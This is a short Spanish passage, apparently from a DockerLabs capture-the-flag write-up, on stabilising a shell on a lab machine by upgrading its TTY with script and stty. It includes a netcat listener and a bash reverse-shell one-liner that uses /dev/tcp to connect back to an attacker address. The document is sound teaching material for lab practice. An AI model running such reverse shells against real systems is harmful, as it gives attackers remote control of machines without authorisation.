### Tratamiento de la tty

[](https://github.com/albertomarcostic/DockerLabs-WriteUps/blob/main/M%C3%A1quina%20HackPenguin.md#tratamiento-de-la-tty)

Si tenemos problemas al aplicar el tratamiento de la **tty**, lo que podemos hacer es ponernos en escucha desde una consola nueva por un puerto. Por ejemplo con **netcat**

```shell
nc -nlvp 443
```

Y nos enviamos desde la máquina víctima una reverse shell para acceder:

```shell
bash -c "bash -i >&/dev/tcp/10.0.2.15/443 0>&1" 
```



---

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```

(hacemos **ctrl + Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina. Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.